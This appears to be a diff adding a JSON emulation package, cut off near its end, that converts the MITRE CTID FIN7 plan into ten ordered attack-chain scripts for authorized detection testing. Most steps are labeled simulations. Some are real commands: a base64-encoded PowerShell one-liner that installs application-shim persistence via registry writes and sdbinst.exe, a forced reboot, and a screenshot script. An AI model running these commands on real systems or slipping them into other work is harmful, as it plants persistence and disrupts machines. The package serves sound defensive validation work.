@@ -1,0 +1,615 @@
+{
+  "package_id": "ctid-fin7-v1",
+  "package_name": "CTID - FIN7 Full Emulation",
+  "version": "1.0.0",
+  "description": "Threat-informed FIN7 full emulation based on 10 ordered CTID procedures. Use it to assess cross-tactic detection and response across a documented multi-stage intrusion; 4 procedure variants use source commands and 6 use executable Morgana-native simulations.",
+  "summary": "Threat-informed emulation of documented FIN7 behavior and attack progression.",
+  "purpose": "Validate defensive performance across a multi-stage FIN7 scenario rather than isolated techniques.",
+  "capabilities": [
+    "Preserves 10 CTID procedures in source order across 10 tactics.",
+    "Creates operational Morgana Attack Chains using source commands and labeled telemetry simulations.",
+    "Retains CTI references, procedure steps, source requirements, ATT&CK mappings, and conversion limitations."
+  ],
+  "use_cases": [
+    "Run a threat-informed Purple Team assessment modeled on documented FIN7 behaviors.",
+    "Evaluate cross-stage prevention, telemetry, detection, investigation, and response handoffs.",
+    "Customize a source-faithful baseline Chain for an authorized environment while retaining provenance."
+  ],
+  "safety_notes": [
+    "Review every source command, simulation, required Tag, and cleanup action before execution.",
+    "Payload-dependent and external C2 procedures use sandboxed or loopback Morgana simulations until exact dependencies are packaged.",
+    "Threat-informed adversary emulation content is for explicitly authorized security validation and defensive testing only."
+  ],
+  "author": "MITRE CTID / X3M.AI conversion",
+  "created": "2026-08-28",
+  "script_prefix": "CTID - ",
+  "provider": "mitre-ctid",
+  "source": "ctid-adversary-emulation-library",
+  "source_repository": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library",
+  "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+  "source_license": "Apache-2.0",
+  "reference_converter": {
+    "name": "MITRE Emu",
+    "repository": "https://github.com/mitre/emu",
+    "commit": "ef3bc4fa8fb605c774446ba7741365ba45d375a8"
+  },
+  "documentation_url": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7",
+  "mitre_domain": "enterprise-attack",
+  "attack_version": "8.1",
+  "mitre_tactic": "Multiple",
+  "mitre_tcodes": [
+    "T1003.002",
+    "T1027",
+    "T1057",
+    "T1059.003",
+    "T1113",
+    "T1546.011",
+    "T1560.001",
+    "T1570",
+    "T1574.001"
+  ],
+  "platform": [
+    "windows"
+  ],
+  "plan_type": "full-emulation",
+  "adversary": "FIN7",
+  "intelligence_summary": "FIN7 is a threat group attributed",
+  "scenario_count": 1,
+  "scenario_names": [
+    "Canonical Emulation Flow"
+  ],
+  "chain_names": [
+    "CTID - FIN7 - Canonical Emulation Flow"
+  ],
+  "complexity": "advanced",
+  "source_procedure_count": 10,
+  "converted_procedure_count": 10,
+  "manual_procedure_count": 0,
+  "simulated_procedure_count": 6,
+  "skipped_procedure_count": 0,
+  "prerequisites": [
+    "Morgana Agent installed on each explicitly authorized execution host",
+    "Plan Tags configured for the lab; credential and target defaults are intentionally blank",
+    "Operator review of every source command, simulation, and external dependency before Chain execution"
+  ],
+  "tag_categories": [
+    {
+      "category_id": "ctid_fin7_inputs",
+      "label": "FIN7 Scenario Inputs",
+      "description": "Plan-wide CTID facts required by automated procedure variants.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1113"
+      ],
+      "tags": [
+        {
+          "key": "ctid_fin7_domain",
+          "label": "Domain",
+          "description": "The name of the target domain",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        },
+        {
+          "key": "ctid_fin7_domain_admin_username",
+          "label": "Domain Admin Username",
+          "description": "The username of the domain administrator",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true,
+          "parameter_class": "connection",
+          "source_default_class": "network-target"
+        }
+      ]
+    }
+  ],
+  "assets": [],
+  "scripts": [
+    {
+      "id": "CTID - FIN7 - T1113 - Screenshot of end-users desktop",
+      "name": "CTID - FIN7 - T1113 - Screenshot of end-users desktop",
+      "description": "Take screenshots of end user's endpoint.",
+      "tactic": "Collection",
+      "tcode": "T1113",
+      "technique_name": "Screen Capture",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "ctid_fin7_domain_admin_username",
+        "ctid_fin7_domain"
+      ],
+      "required_assets": [],
+      "command": "powershell.exe C:\\\\Users\\\\#{ctid_fin7_domain_admin_username}.#{ctid_fin7_domain}\\\\AppData\\\\Local\\\\takeScreenshot.ps1",
+      "cleanup_command": null,
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "eac2cf0f-7b51-44d2-83cb-57a34a29b7ff",
+        "source_order": 1,
+        "procedure_step": "3.B",
+        "procedure_group": "procedure_collection",
+        "cti_source": "https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1059.003 - Execution of stager.ps1",
+      "name": "CTID - FIN7 - T1059.003 - Execution of stager.ps1",
+      "description": "Execution of previously placed stager. Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "Execution",
+      "tcode": "T1059.003",
+      "technique_name": "Command and Scripting Interpreter - Windows Command Shell",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1059.003'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-002-t1059-003.txt'; $collectionDir = Join-Path $simulationRoot 'collection'; New-Item -ItemType Directory $collectionDir -Force | Out-Null; 1..3 | ForEach-Object { Set-Content (Join-Path $collectionDir \"sample-$_.txt\") \"CTID sample data $_\" }; Compress-Archive -Path (Join-Path $collectionDir '*') -DestinationPath (Join-Path $simulationRoot 'collection.zip') -Force; Get-Item (Join-Path $simulationRoot 'collection.zip'); Write-Output '[SUCCESS] CTID simulation T1059.003 family=collection';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "82d2f5c7-7561-4d91-96d2-959473b9ad2b",
+        "source_order": 2,
+        "procedure_step": "4.A",
+        "procedure_group": "procedure_execution",
+        "cti_source": "https://blog.morphisec.com/fin7-attacks-restaurant-industry",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "collection",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "stager.ps1"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1057 - Enumerate",
+      "name": "CTID - FIN7 - T1057 - Enumerate",
+      "description": "Perform process discovery (T1057)",
+      "tactic": "Discovery/Execution",
+      "tcode": "T1057",
+      "technique_name": "Process Discovery",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "powershell.exe -c \"ps\"",
+      "cleanup_command": null,
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "ab937ef4-7c66-4349-ad3b-658c41fcf4c5",
+        "source_order": 3,
+        "procedure_step": "5.A.1",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1003.002 - Execute SAMCats (Mimikatz)",
+      "name": "CTID - FIN7 - T1003.002 - Execute SAMCats (Mimikatz)",
+      "description": "Dump SAM via Mimikatz(T1003.002) Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "OS Credential Dumping",
+      "tcode": "T1003.002",
+      "technique_name": "OS Credential Dumping: Security Account Manager",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1003.002'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-004-t1003-002.txt'; Set-Content $artifactPath 'credential_fixture=synthetic_value'; Select-String -Path $artifactPath -Pattern 'credential_fixture'; Write-Output '[SUCCESS] CTID simulation T1003.002 family=credential';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "b15d3014-a5d1-4ec6-934b-d7fe44451192",
+        "source_order": 4,
+        "procedure_step": "5.A.2",
+        "procedure_group": "procedure_cred_access",
+        "cti_source": "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "credential",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "uac-samcats.ps1",
+          "samcat.exe"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1570 - Expand Access to itadmin",
+      "name": "CTID - FIN7 - T1570 - Expand Access to itadmin",
+      "description": "Leverage PAExec to laterally move and execute on itadmin Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "Lateral Movement",
+      "tcode": "T1570",
+      "technique_name": "Lateral Tool Transfer",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1570'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-005-t1570.txt'; Test-NetConnection -ComputerName 127.0.0.1 -Port 445 -InformationLevel Detailed | Select-Object ComputerName,RemotePort,TcpTestSucceeded; Write-Output '[SUCCESS] CTID simulation T1570 family=lateral';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "9a76889c-9518-4b3e-9c87-6618156015c6",
+        "source_order": 5,
+        "procedure_step": "6.A",
+        "procedure_group": "procedure_lat_movement",
+        "cti_source": "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "hollow.exe",
+          "paexec.exe"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1574.001 - Privilege Escalation",
+      "name": "CTID - FIN7 - T1574.001 - Privilege Escalation",
+      "description": "Perform DLL hijack to escalate privileges. Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "Hijack Execution Flow - DLL Search Order Hijacking",
+      "tcode": "T1574.001",
+      "technique_name": "Hijack Execution Flow - DLL Search Order Hijacking",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1574.001'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-006-t1574-001.txt'; $childPath = Join-Path $simulationRoot 'ctid-child.ps1'; Set-Content $childPath \"Write-Output 'CTID child process telemetry'\"; & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $childPath; Write-Output '[SUCCESS] CTID simulation T1574.001 family=execution';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "ab48e12f-def0-40a4-b3d9-ad958f45202a",
+        "source_order": 6,
+        "procedure_step": "7.A",
+        "procedure_group": "procedure_priv_escalation",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2019/10/mahalo-fin7-responding-to-new-tools-and-techniques.html",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "execution",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "BOOSTWRITE.dll"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1027 - Setup Application Shim Persistence",
+      "name": "CTID - FIN7 - T1027 - Setup Application Shim Persistence",
+      "description": "Execute PowerShell oneliner to install application shim.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1027",
+      "technique_name": "Obfuscated Files or Information",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "powershell.exe -noprofile -encodedCommand \"JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA==\"",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "eb99abcb-93e2-4a3e-bf05-a484839dc851",
+        "source_order": 7,
+        "procedure_step": "9.B",
+        "procedure_group": "procedure_def_evasion",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1546.011 - Execute Application Shim Persistence",
+      "name": "CTID - FIN7 - T1546.011 - Execute Application Shim Persistence",
+      "description": "Reboot the host to start shim persistence.",
+      "tactic": "Persistence",
+      "tcode": "T1546.011",
+      "technique_name": "Application Shimming",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "powershell.exe -c \"restart-computer -force\"",
+      "cleanup_command": null,
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "6ec6561b-e535-4fe3-9c20-a52e5982b513",
+        "source_order": 8,
+        "procedure_step": "10.A",
+        "procedure_group": "procedure_persistence",
+        "cti_source": "https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1057 - Execute PillowMint Credit Card Scraper",
+      "name": "CTID - FIN7 - T1057 - Execute PillowMint Credit Card Scraper",
+      "description": "Upload and execute the PillowMint credit card scraper as debug.exe Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "discovery",
+      "tcode": "T1057",
+      "technique_name": "Process Discovery",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1057'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-009-t1057.txt'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,LastBootUpTime; Get-Process | Select-Object -First 10 Name,Id,Path; Get-NetIPConfiguration -ErrorAction SilentlyContinue | Select-Object InterfaceAlias,IPv4Address; Write-Output '[SUCCESS] CTID simulation T1057 family=discovery';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "d04a02e1-a05c-46f8-adf0-c036266fe0a1",
+        "source_order": 9,
+        "procedure_step": "10.B.1",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "discovery",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "pillowMint.exe"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - FIN7 - T1560.001 - Archive Credit Card Data",
+      "name": "CTID - FIN7 - T1560.001 - Archive Credit Card Data",
+      "description": "Compress credit card data into an archive using 7za.exe Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "exfiltration",
+      "tcode": "T1560.001",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1560.001'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-010-t1560-001.txt'; $listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Loopback,0); $listener.Start(); $port = ([Net.IPEndPoint]$listener.LocalEndpoint).Port; $client = [Net.Sockets.TcpClient]::new('127.0.0.1',$port); $serverClient = $listener.AcceptTcpClient(); $bytes = [Text.Encoding]::UTF8.GetBytes('CTID network simulation'); $client.GetStream().Write($bytes,0,$bytes.Length); $buffer = New-Object byte[] 64; $read = $serverClient.GetStream().Read($buffer,0,$buffer.Length); [Text.Encoding]::UTF8.GetString($buffer,0,$read); $client.Close(); $serverClient.Close(); $listener.Stop(); Write-Output '[SUCCESS] CTID simulation T1560.001 family=network';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "FIN7",
+        "plan_type": "full-emulation",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "source_ability_id": "89b84389-036e-4c3d-a490-bf8ba50bffe8",
+        "source_order": 10,
+        "procedure_step": "10.B.2",
+        "procedure_group": "procedure_exfiltration",
+        "cti_source": "https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/",
+        "source_path": "fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/fin7/Emulation_Plan/yaml/Fin7.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "7za.exe"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    }
+  ],
+  "chains": [
+    {
+      "name": "CTID - FIN7 - Canonical Emulation Flow",
+      "description": "Source-ordered FIN7 emulation flow. Self-contained source commands run directly; unavailable payload, C2, and executor dependencies use labeled operational simulations.",
+      "objective": "Emulate the documented multi-stage FIN7 intrusion flow to validate cross-tactic detection and response coverage.",
+      "author": "MITRE CTID / X3M.AI conversion",
+      "tags": [
+        "ctid",
+        "threat-informed",
+        "full-emulation",
+        "adversary:fin7"
+      ],
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan_type": "full-emulation",
+        "adversary": "FIN7",
+        "source_plan_id": "c30763a7-172c-431e-a877-b18aecf9292a",
+        "scenario_id": "canonical",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7"
+      },
+      "plan_type": "full-emulation",
+      "adversary": "FIN7",
+      "scenario_id": "canonical",
+      "scenario_name": "Canonical Emulation Flow",
+      "flow": {
+        "nodes": [
+          {
+            "id": "procedure-001-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1113 - Screenshot of end-users desktop",
+            "source_step": "3.B"
+          },
+          {
+            "id": "procedure-002-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1059.003 - Execution of stager.ps1",
+            "source_step": "4.A"
+          },
+          {
+            "id": "procedure-003-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1057 - Enumerate",
+            "source_step": "5.A.1"
+          },
+          {
+            "id": "procedure-004-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1003.002 - Execute SAMCats (Mimikatz)",
+            "source_step": "5.A.2"
+          },
+          {
+            "id": "procedure-005-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1570 - Expand Access to itadmin",
+            "source_step": "6.A"
+          },
+          {
+            "id": "procedure-006-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1574.001 - Privilege Escalation",
+            "source_step": "7.A"
+          },
+          {
+            "id": "procedure-007-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1027 - Setup Application Shim Persistence",
+            "source_step": "9.B"
+          },
+          {
+            "id": "procedure-008-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1546.011 - Execute Application Shim Persistence",
+            "source_step": "10.A"
+          },
+          {
+            "id": "procedure-009-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1057 - Execute PillowMint Credit Card Scraper",
+            "source_step": "10.B.1"
+          },
+          {
+            "id": "procedure-010-1",
+            "type": "script",
+            "script_ref": "CTID - FIN7 - T1560.001 - Archive Credit Card Data",
+            "source_step": "10.B.2"
+          }
